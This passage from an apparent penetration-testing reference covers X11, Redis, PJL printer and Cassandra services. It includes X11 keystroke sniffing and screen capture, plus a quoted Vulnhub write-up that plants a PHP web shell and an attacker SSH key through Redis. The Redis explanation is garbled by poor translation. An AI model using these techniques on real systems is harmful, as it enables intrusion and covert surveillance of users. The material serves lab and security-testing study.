<p>For more information: Refer: <a class="reference external" href="http://rageweb.info/2014/05/04/open-x11-server/">Open-x11-server</a></p>
</div>
</div>
<div class="section" id="id55">
<h3>Other<a class="headerlink" href="#id55" title="Permalink to this headline">¶</a></h3>
<div class="section" id="xspy">
<h4>xspy<a class="headerlink" href="#xspy" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="http://tools.kali.org/sniffingspoofing/xspy">xspy</a> to sniff the keyboard keystrokes.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">xspy</span> <span class="mf">10.9</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>

<span class="n">opened</span> <span class="mf">10.9</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">0</span> <span class="k">for</span> <span class="n">snoopng</span>
<span class="n">swaBackSpaceCaps_Lock</span> <span class="n">josephtTabcBackSpaceShift_L</span> <span class="n">workShift_L</span> <span class="mi">2123</span>
<span class="n">qsaminusKP_Down</span> <span class="n">KP_Begin</span> <span class="n">KP_Down</span> <span class="n">KP_Left</span> <span class="n">KP_Insert</span> <span class="n">TabRightLeftRightDeletebTabDownnTabKP_End</span> <span class="n">KP_Right</span> <span class="n">KP_Up</span> <span class="n">KP_Down</span> <span class="n">KP_Up</span> <span class="n">KP_Up</span> <span class="n">TabmtminusdBackSpacewinTab</span>
</pre></div>
</div>
</div>
<div class="section" id="xdpyinfo">
<h4>xdpyinfo<a class="headerlink" href="#xdpyinfo" title="Permalink to this headline">¶</a></h4>
<p>We can also use x11 to grab <strong>screenshots or live videos</strong> of the user. We need to  verify the connection is open and we can get to it:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">xdpyinfo</span> <span class="o">-</span><span class="n">display</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;</span><span class="n">display</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">xdpyinfo</span> <span class="o">-</span><span class="n">display</span> <span class="mf">10.20</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">0</span>
<span class="n">name</span> <span class="n">of</span> <span class="n">display</span><span class="p">:</span>    <span class="mf">10.20</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">0</span>
<span class="n">version</span> <span class="n">number</span><span class="p">:</span>    <span class="mf">11.0</span>
<span class="n">vendor</span> <span class="n">string</span><span class="p">:</span>    <span class="n">Xfree86</span><span class="o">-</span><span class="n">Heidenhain</span><span class="o">-</span><span class="n">Project</span>
<span class="n">vendor</span> <span class="n">release</span> <span class="n">number</span><span class="p">:</span>    <span class="mi">0</span>
<span class="n">maximum</span> <span class="n">request</span> <span class="n">size</span><span class="p">:</span>  <span class="mi">262140</span> <span class="nb">bytes</span>
<span class="n">motion</span> <span class="n">buffer</span> <span class="n">size</span><span class="p">:</span>  <span class="mi">0</span>
<span class="n">bitmap</span> <span class="n">unit</span><span class="p">,</span> <span class="n">bit</span> <span class="n">order</span><span class="p">,</span> <span class="n">padding</span><span class="p">:</span>    <span class="mi">32</span><span class="p">,</span> <span class="n">LSBFirst</span><span class="p">,</span> <span class="mi">32</span>
<span class="n">image</span> <span class="n">byte</span> <span class="n">order</span><span class="p">:</span>    <span class="n">LSBFirst</span>
<span class="n">number</span> <span class="n">of</span> <span class="n">supported</span> <span class="n">pixmap</span> <span class="n">formats</span><span class="p">:</span>    <span class="mi">6</span>
<span class="n">supported</span> <span class="n">pixmap</span> <span class="n">formats</span><span class="p">:</span>
    <span class="n">depth</span> <span class="mi">1</span><span class="p">,</span> <span class="n">bits_per_pixel</span> <span class="mi">1</span><span class="p">,</span> <span class="n">scanline_pad</span> <span class="mi">32</span>
    <span class="n">depth</span> <span class="mi">4</span><span class="p">,</span> <span class="n">bits_per_pixel</span> <span class="mi">8</span><span class="p">,</span> <span class="n">scanline_pad</span> <span class="mi">32</span>
    <span class="n">depth</span> <span class="mi">8</span><span class="p">,</span> <span class="n">bits_per_pixel</span> <span class="mi">8</span><span class="p">,</span> <span class="n">scanline_pad</span> <span class="mi">32</span>
    <span class="n">depth</span> <span class="mi">15</span><span class="p">,</span> <span class="n">bits_per_pixel</span> <span class="mi">16</span><span class="p">,</span> <span class="n">scanline_pad</span> <span class="mi">32</span>
    <span class="n">depth</span> <span class="mi">16</span><span class="p">,</span> <span class="n">bits_per_pixel</span> <span class="mi">16</span><span class="p">,</span> <span class="n">scanline_pad</span> <span class="mi">32</span>
    <span class="n">depth</span> <span class="mi">24</span><span class="p">,</span> <span class="n">bits_per_pixel</span> <span class="mi">32</span><span class="p">,</span> <span class="n">scanline_pad</span> <span class="mi">32</span>
<span class="n">keycode</span> <span class="nb">range</span><span class="p">:</span>    <span class="n">minimum</span> <span class="mi">8</span><span class="p">,</span> <span class="n">maximum</span> <span class="mi">255</span>
<span class="n">focus</span><span class="p">:</span>  <span class="n">window</span> <span class="mh">0x600005</span><span class="p">,</span> <span class="n">revert</span> <span class="n">to</span> <span class="n">Parent</span>
<span class="n">number</span> <span class="n">of</span> <span class="n">extensions</span><span class="p">:</span>    <span class="mi">11</span>
   <span class="n">FontCache</span>
    <span class="n">MIT</span><span class="o">-</span><span class="n">SCREEN</span><span class="o">-</span><span class="n">SAVER</span>
    <span class="n">MIT</span><span class="o">-</span><span class="n">SHM</span>
    <span class="n">RECORD</span>
    <span class="n">SECURITY</span>
    <span class="n">SHAPE</span>
    <span class="n">XC</span><span class="o">-</span><span class="n">MISC</span>
    <span class="n">XFree86</span><span class="o">-</span><span class="n">DGA</span>
    <span class="n">XFree86</span><span class="o">-</span><span class="n">VidModeExtension</span>
    <span class="n">XInputExtension</span>
    <span class="n">XVideo</span>
<span class="n">default</span> <span class="n">screen</span> <span class="n">number</span><span class="p">:</span>    <span class="mi">0</span>
<span class="n">number</span> <span class="n">of</span> <span class="n">screens</span><span class="p">:</span>    <span class="mi">1</span>
 <span class="n">screen</span> <span class="c1">#0:</span>
 <span class="n">dimensions</span><span class="p">:</span>    <span class="mi">1024</span><span class="n">x768</span> <span class="n">pixels</span> <span class="p">(</span><span class="mi">347</span><span class="n">x260</span> <span class="n">millimeters</span><span class="p">)</span>
  <span class="n">resolution</span><span class="p">:</span>    <span class="mi">75</span><span class="n">x75</span> <span class="n">dots</span> <span class="n">per</span> <span class="n">inch</span>
  <span class="n">depths</span> <span class="p">(</span><span class="mi">6</span><span class="p">):</span>    <span class="mi">16</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">24</span>
  <span class="n">root</span> <span class="n">window</span> <span class="nb">id</span><span class="p">:</span>    <span class="mh">0x25</span>
  <span class="n">depth</span> <span class="n">of</span> <span class="n">root</span> <span class="n">window</span><span class="p">:</span>    <span class="mi">16</span> <span class="n">planes</span>
  <span class="n">number</span> <span class="n">of</span> <span class="n">colormaps</span><span class="p">:</span>    <span class="n">minimum</span> <span class="mi">1</span><span class="p">,</span> <span class="n">maximum</span> <span class="mi">1</span>
  <span class="n">default</span> <span class="n">colormap</span><span class="p">:</span>    <span class="mh">0x20</span>
  <span class="n">default</span> <span class="n">number</span> <span class="n">of</span> <span class="n">colormap</span> <span class="n">cells</span><span class="p">:</span>    <span class="mi">64</span>
  <span class="n">preallocated</span> <span class="n">pixels</span><span class="p">:</span>    <span class="n">black</span> <span class="mi">0</span><span class="p">,</span> <span class="n">white</span> <span class="mi">65535</span>
  <span class="n">options</span><span class="p">:</span>    <span class="n">backing</span><span class="o">-</span><span class="n">store</span> <span class="n">NO</span><span class="p">,</span> <span class="n">save</span><span class="o">-</span><span class="n">unders</span> <span class="n">NO</span>
  <span class="n">largest</span> <span class="n">cursor</span><span class="p">:</span>    <span class="mi">32</span><span class="n">x32</span>
  <span class="n">current</span> <span class="nb">input</span> <span class="n">event</span> <span class="n">mask</span><span class="p">:</span>    <span class="mh">0x0</span>
  <span class="n">number</span> <span class="n">of</span> <span class="n">visuals</span><span class="p">:</span>    <span class="mi">2</span>
  <span class="n">default</span> <span class="n">visual</span> <span class="nb">id</span><span class="p">:</span>  <span class="mh">0x21</span>
  <span class="n">visual</span><span class="p">:</span>
  <span class="n">visual</span> <span class="nb">id</span><span class="p">:</span>    <span class="mh">0x21</span>
  <span class="n">class</span><span class="p">:</span>    <span class="n">TrueColor</span>
  <span class="n">depth</span><span class="p">:</span>    <span class="mi">16</span> <span class="n">planes</span>
  <span class="n">available</span> <span class="n">colormap</span> <span class="n">entries</span><span class="p">:</span>    <span class="mi">64</span> <span class="n">per</span> <span class="n">subfield</span>
  <span class="n">red</span><span class="p">,</span> <span class="n">green</span><span class="p">,</span> <span class="n">blue</span> <span class="n">masks</span><span class="p">:</span>    <span class="mh">0xf800</span><span class="p">,</span> <span class="mh">0x7e0</span><span class="p">,</span> <span class="mh">0x1f</span>
  <span class="n">significant</span> <span class="n">bits</span> <span class="ow">in</span> <span class="n">color</span> <span class="n">specification</span><span class="p">:</span>    <span class="mi">6</span> <span class="n">bits</span>
<span class="n">visual</span><span class="p">:</span>
  <span class="n">visual</span> <span class="nb">id</span><span class="p">:</span>    <span class="mh">0x22</span>
  <span class="n">class</span><span class="p">:</span>    <span class="n">DirectColor</span>
  <span class="n">depth</span><span class="p">:</span>    <span class="mi">16</span> <span class="n">planes</span>
  <span class="n">available</span> <span class="n">colormap</span> <span class="n">entries</span><span class="p">:</span>    <span class="mi">64</span> <span class="n">per</span> <span class="n">subfield</span>
  <span class="n">red</span><span class="p">,</span> <span class="n">green</span><span class="p">,</span> <span class="n">blue</span> <span class="n">masks</span><span class="p">:</span>    <span class="mh">0xf800</span><span class="p">,</span> <span class="mh">0x7e0</span><span class="p">,</span> <span class="mh">0x1f</span>
  <span class="n">significant</span> <span class="n">bits</span> <span class="ow">in</span> <span class="n">color</span> <span class="n">specification</span><span class="p">:</span>    <span class="mi">6</span> <span class="n">bits</span>
</pre></div>
</div>
</div>
<div class="section" id="xwd">
<h4>xwd<a class="headerlink" href="#xwd" title="Permalink to this headline">¶</a></h4>
<p>To take the <strong>screenshot</strong> use:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">xwd</span> <span class="o">-</span><span class="n">root</span> <span class="o">-</span><span class="n">display</span> <span class="mf">10.20</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">0</span> <span class="o">-</span><span class="n">out</span> <span class="n">xdump</span><span class="o">.</span><span class="n">xdump</span>
<span class="n">display</span> <span class="n">xdump</span><span class="o">.</span><span class="n">xdump</span>
</pre></div>
</div>
</div>
<div class="section" id="xwininfo">
<h4>xwininfo<a class="headerlink" href="#xwininfo" title="Permalink to this headline">¶</a></h4>
<p><strong>live viewing</strong>:</p>
<p>First we need to find the ID of the window using xwininfo</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">xwininfo</span> <span class="o">-</span><span class="n">root</span> <span class="o">-</span><span class="n">display</span> <span class="mf">10.9</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">0</span>

<span class="n">xwininfo</span><span class="p">:</span> <span class="n">Window</span> <span class="nb">id</span><span class="p">:</span> <span class="mh">0x45</span> <span class="p">(</span><span class="n">the</span> <span class="n">root</span> <span class="n">window</span><span class="p">)</span> <span class="p">(</span><span class="n">has</span> <span class="n">no</span> <span class="n">name</span><span class="p">)</span>

<span class="n">Absolute</span> <span class="n">upper</span><span class="o">-</span><span class="n">left</span> <span class="n">X</span><span class="p">:</span>  <span class="mi">0</span>
<span class="n">Absolute</span> <span class="n">upper</span><span class="o">-</span><span class="n">left</span> <span class="n">Y</span><span class="p">:</span>  <span class="mi">0</span>
<span class="n">Relative</span> <span class="n">upper</span><span class="o">-</span><span class="n">left</span> <span class="n">X</span><span class="p">:</span>  <span class="mi">0</span>
<span class="n">Relative</span> <span class="n">upper</span><span class="o">-</span><span class="n">left</span> <span class="n">Y</span><span class="p">:</span>  <span class="mi">0</span>
<span class="n">Width</span><span class="p">:</span> <span class="mi">1024</span>
<span class="n">Height</span><span class="p">:</span> <span class="mi">768</span>
<span class="n">Depth</span><span class="p">:</span> <span class="mi">16</span>
<span class="n">Visual</span><span class="p">:</span> <span class="mh">0x21</span>
<span class="n">Visual</span> <span class="n">Class</span><span class="p">:</span> <span class="n">TrueColor</span>
<span class="n">Border</span> <span class="n">width</span><span class="p">:</span> <span class="mi">0</span>
<span class="n">Class</span><span class="p">:</span> <span class="n">InputOutput</span>
<span class="n">Colormap</span><span class="p">:</span> <span class="mh">0x20</span> <span class="p">(</span><span class="n">installed</span><span class="p">)</span>
<span class="n">Bit</span> <span class="n">Gravity</span> <span class="n">State</span><span class="p">:</span> <span class="n">ForgetGravity</span>
<span class="n">Window</span> <span class="n">Gravity</span> <span class="n">State</span><span class="p">:</span> <span class="n">NorthWestGravity</span>
<span class="n">Backing</span> <span class="n">Store</span> <span class="n">State</span><span class="p">:</span> <span class="n">NotUseful</span>
<span class="n">Save</span> <span class="n">Under</span> <span class="n">State</span><span class="p">:</span> <span class="n">no</span>
<span class="n">Map</span> <span class="n">State</span><span class="p">:</span> <span class="n">IsViewable</span>
<span class="n">Override</span> <span class="n">Redirect</span> <span class="n">State</span><span class="p">:</span> <span class="n">no</span>
<span class="n">Corners</span><span class="p">:</span>  <span class="o">+</span><span class="mi">0</span><span class="o">+</span><span class="mi">0</span>  <span class="o">-</span><span class="mi">0</span><span class="o">+</span><span class="mi">0</span>  <span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">0</span>  <span class="o">+</span><span class="mi">0</span><span class="o">-</span><span class="mi">0</span>
<span class="o">-</span><span class="n">geometry</span> <span class="mi">1024</span><span class="n">x768</span><span class="o">+</span><span class="mi">0</span><span class="o">+</span><span class="mi">0</span>
</pre></div>
</div>
</div>
<div class="section" id="xwatchwin">
<h4>XWatchwin<a class="headerlink" href="#xwatchwin" title="Permalink to this headline">¶</a></h4>
<p>For <strong>live viewing</strong> we need to use</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">./</span><span class="n">xwatchwin</span> <span class="p">[</span><span class="o">-</span><span class="n">v</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">u</span> <span class="n">UpdateTime</span><span class="p">]</span> <span class="n">DisplayName</span> <span class="p">{</span> <span class="o">-</span><span class="n">w</span> <span class="n">windowID</span> <span class="o">|</span> <span class="n">WindowName</span> <span class="p">}</span> <span class="o">-</span><span class="n">w</span> <span class="n">window</span> <span class="n">Id</span> <span class="ow">is</span> <span class="n">the</span> <span class="n">one</span> <span class="n">found</span> <span class="n">on</span> <span class="n">xwininfo</span>
<span class="o">./</span><span class="n">xwatchwin</span> <span class="mf">10.9</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">0</span> <span class="o">-</span><span class="n">w</span> <span class="mh">0x45</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="redis-port-6379">
<h2>Redis - Port 6379<a class="headerlink" href="#redis-port-6379" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id57">
<h3>Nmap<a class="headerlink" href="#id57" title="Permalink to this headline">¶</a></h3>
<ul class="simple">
<li>redis info script</li>
</ul>
</div>
<div class="section" id="id58">
<h3>Metasploit<a class="headerlink" href="#id58" title="Permalink to this headline">¶</a></h3>
<blockquote>
<div>has three modules on redis:</div></blockquote>
<ul class="simple">
<li>login</li>
<li>info and</li>
<li>file upload</li>
</ul>
</div>
<div class="section" id="id59">
<h3>Other<a class="headerlink" href="#id59" title="Permalink to this headline">¶</a></h3>
<p>The below is taken from <a class="reference external" href="https://github.com/tfairane/Redis.turb">tfairane redis</a> where he has presented a write up for the Vulnhub machine</p>
<ul class="simple">
<li>First , the web server on the server broadcasts, including a simple PHP code and create a back door, which will help us to execute commands on the server. Or it will enable us to take direct shell weevely , webacoo to upload the files we create with tools like.</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">CONFIG</span> <span class="n">SET</span> <span class="nb">dir</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span>
<span class="n">CONFIG</span> <span class="n">SET</span> <span class="n">dbfilename</span> <span class="n">shell</span><span class="o">.</span><span class="n">php</span>
<span class="n">CONFIG</span> <span class="n">GET</span> <span class="n">dbfilename</span>
<span class="mi">1</span><span class="p">)</span> <span class="s2">&quot;dbfilename&quot;</span>
<span class="mi">2</span><span class="p">)</span> <span class="s2">&quot;bomba.php&quot;</span>

<span class="n">SET</span> <span class="n">cmd</span> <span class="s2">&quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot;</span>
<span class="n">OK</span>
<span class="n">BGSAVE</span>
</pre></div>
</div>
<p>which can be accessed using</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>http://IP/shell.php?cmd=whoami
www-data
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Second , file type found in the users home directory because it is our right and remote SSH access with a key instead of using the password used to connect to create kei ,they may be directly unencrypted user rights that provide access to the system.</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="mi">1</span><span class="p">:</span>  <span class="n">ssh</span><span class="o">-</span><span class="n">keygen</span> <span class="o">-</span><span class="n">t</span> <span class="n">rsa</span>
<span class="mi">2</span><span class="p">:</span>
<span class="mi">3</span><span class="p">:</span>  <span class="p">(</span><span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> <span class="n">cat</span> <span class="n">id_rsa</span><span class="o">.</span><span class="n">pub</span><span class="p">;</span> <span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">auth_key</span>
<span class="mi">4</span><span class="p">:</span>
<span class="mi">5</span><span class="p">:</span>  <span class="n">cat</span> <span class="n">auth_key</span> <span class="o">|</span> <span class="n">redis</span><span class="o">-</span><span class="n">cli</span> <span class="o">-</span><span class="n">h</span> <span class="n">kevgir</span> <span class="o">-</span><span class="n">x</span> <span class="nb">set</span> <span class="n">crackit</span>
<span class="mi">6</span><span class="p">:</span>  <span class="n">redis</span><span class="o">-</span><span class="n">cli</span> <span class="o">-</span><span class="n">h</span> <span class="n">kevgir</span>
<span class="mi">7</span><span class="p">:</span>
<span class="mi">8</span><span class="p">:</span>  <span class="n">config</span> <span class="nb">set</span> <span class="nb">dir</span> <span class="o">/</span><span class="n">root</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span>
<span class="mi">9</span><span class="p">:</span>  <span class="n">config</span> <span class="n">get</span> <span class="nb">dir</span>
<span class="mi">10</span><span class="p">:</span>  <span class="n">config</span> <span class="nb">set</span> <span class="n">dbfilename</span> <span class="s2">&quot;authorized_keys&quot;</span>
<span class="mi">11</span><span class="p">:</span>  <span class="n">save</span>
<span class="mi">12</span><span class="p">:</span>
<span class="mi">13</span><span class="p">:</span>  <span class="n">config</span> <span class="nb">set</span> <span class="nb">dir</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">user</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span>
<span class="mi">14</span><span class="p">:</span>  <span class="n">save</span>
<span class="mi">15</span><span class="p">:</span>
<span class="mi">16</span><span class="p">:</span>  <span class="n">config</span> <span class="nb">set</span> <span class="nb">dir</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">admin</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span>
<span class="mi">17</span><span class="p">:</span>
<span class="mi">18</span><span class="p">:</span>  <span class="n">ssh</span> <span class="n">user</span><span class="nd">@kevgir</span> <span class="o">-</span><span class="n">p</span> <span class="mi">1322</span> <span class="o">-</span><span class="n">i</span> <span class="n">id_rsa</span>
</pre></div>
</div>
<ul class="simple">
<li>1 - He has given parameters in line with a 2048-bit RSA key pair is generated. We can give it a password when we log in.</li>
<li>3 -  The public key of his own and to receive the new line last line auth_key name we are writing a new file. We will upload this file to the target machine via the Redis server.</li>
<li>5 and 6. data from the key input in the standard line that we say we do, and then take the memory contents auth_key entry Redis server.</li>
<li>8, 9, 10, 11 in which the location of the file content to be installed in the line number, which is stated to be added to the bottom of the file. SAVE transactions made by the commands are processed on the server side to make it happen.</li>
<li>13 and 16 lines in the root of the same process that we have done for other users in order to gain access with the privileges they also inside the ssh folder in the main folder authorized_keys are doing the same procedure for writing to file.</li>
</ul>
</div></blockquote>
</div>
</div>
<div class="section" id="pjl-port-9100">
<h2>PJL - Port 9100<a class="headerlink" href="#pjl-port-9100" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id60">
<h3>Metasploit<a class="headerlink" href="#id60" title="Permalink to this headline">¶</a></h3>
<p>There are multiple modules in the metasploit for PJL.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Name</span>                                             <span class="n">Disclosure</span> <span class="n">Date</span>  <span class="n">Rank</span>    <span class="n">Description</span>
<span class="o">----</span>                                             <span class="o">---------------</span>  <span class="o">----</span>    <span class="o">-----------</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">printer</span><span class="o">/</span><span class="n">printer_delete_file</span>                     <span class="n">normal</span>  <span class="n">Printer</span> <span class="n">File</span> <span class="n">Deletion</span> <span class="n">Scanner</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">printer</span><span class="o">/</span><span class="n">printer_download_file</span>                   <span class="n">normal</span>  <span class="n">Printer</span> <span class="n">File</span> <span class="n">Download</span> <span class="n">Scanner</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">printer</span><span class="o">/</span><span class="n">printer_env_vars</span>                        <span class="n">normal</span>  <span class="n">Printer</span> <span class="n">Environment</span> <span class="n">Variables</span> <span class="n">Scanner</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">printer</span><span class="o">/</span><span class="n">printer_list_dir</span>                        <span class="n">normal</span>  <span class="n">Printer</span> <span class="n">Directory</span> <span class="n">Listing</span> <span class="n">Scanner</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">printer</span><span class="o">/</span><span class="n">printer_list_volumes</span>                    <span class="n">normal</span>  <span class="n">Printer</span> <span class="n">Volume</span> <span class="n">Listing</span> <span class="n">Scanner</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">printer</span><span class="o">/</span><span class="n">printer_ready_message</span>                   <span class="n">normal</span>  <span class="n">Printer</span> <span class="n">Ready</span> <span class="n">Message</span> <span class="n">Scanner</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">printer</span><span class="o">/</span><span class="n">printer_upload_file</span>                     <span class="n">normal</span>  <span class="n">Printer</span> <span class="n">File</span> <span class="n">Upload</span> <span class="n">Scanner</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">printer</span><span class="o">/</span><span class="n">printer_version_info</span>                    <span class="n">normal</span>  <span class="n">Printer</span> <span class="n">Version</span> <span class="n">Information</span> <span class="n">Scanner</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">server</span><span class="o">/</span><span class="n">capture</span><span class="o">/</span><span class="n">printjob_capture</span>                         <span class="n">normal</span>  <span class="n">Printjob</span> <span class="n">Capture</span> <span class="n">Service</span>
</pre></div>
</div>
<p>As of now, We only got a chance to use</p>
<div class="section" id="printer-version-information-scanner">
<h4>Printer Version Information Scanner<a class="headerlink" href="#printer-version-information-scanner" title="Permalink to this headline">¶</a></h4>
<p>Scans for printer version information using the Printer Job Language (PJL) protocol.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">printer</span><span class="o">/</span><span class="n">printer_version_info</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">9100</span> <span class="o">-</span> <span class="n">HP</span> <span class="n">LaserJet</span> <span class="n">M1522nf</span> <span class="n">MFP</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">1</span> <span class="n">of</span> <span class="mi">1</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">100</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Auxiliary</span> <span class="n">module</span> <span class="n">execution</span> <span class="n">completed</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id61">
<h3>Nmap<a class="headerlink" href="#id61" title="Permalink to this headline">¶</a></h3>
<div class="section" id="pjl-ready-message">
<h4>PJL-ready-message<a class="headerlink" href="#pjl-ready-message" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/pjl-ready-message.html">PJL-ready-message</a> : It retrieves or sets the ready message on printers that support the Printer Job Language. This includes most PostScript printers that listen on port 9100. Without an argument, displays the current ready message. With the pjl_ready_message script argument, displays the old ready message and changes it to the message given.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">pjl</span><span class="o">-</span><span class="n">ready</span><span class="o">-</span><span class="n">message</span><span class="o">.</span><span class="n">nse</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">p</span> <span class="mi">9100</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>

<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.14</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">9100</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">jetdirect</span>
<span class="o">|</span><span class="n">_pjl</span><span class="o">-</span><span class="n">ready</span><span class="o">-</span><span class="n">message</span><span class="p">:</span> <span class="s2">&quot;Processing...&quot;</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="apache-cassandra-port-9160">
<h2>Apache Cassandra - Port 9160<a class="headerlink" href="#apache-cassandra-port-9160" title="Permalink to this headline">¶</a></h2>
<p>For Apache Cassandra,</p>
<div class="section" id="id63">
<h3>NMap<a class="headerlink" href="#id63" title="Permalink to this headline">¶</a></h3>
<div class="section" id="cassandra-info">
<h4>Cassandra-info<a class="headerlink" href="#cassandra-info" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/cassandra-info.html">cassandra-info.nse</a> which attempts to get basic info and server status from a Cassandra database.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">9160</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="o">-</span><span class="n">n</span> <span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">cassandra</span><span class="o">-</span><span class="n">info</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">27</span> <span class="mi">21</span><span class="p">:</span><span class="mi">14</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.16</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">9160</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">cassandra</span>
<span class="o">|</span> <span class="n">cassandra</span><span class="o">-</span><span class="n">info</span><span class="p">:</span>
<span class="o">|</span>   <span class="n">Cluster</span> <span class="n">name</span><span class="p">:</span> <span class="n">Convoy</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">Version</span><span class="p">:</span> <span class="mf">19.20</span><span class="o">.</span><span class="mi">0</span>
</pre></div>
</div>
</div>
<div class="section" id="cassandra-brute">
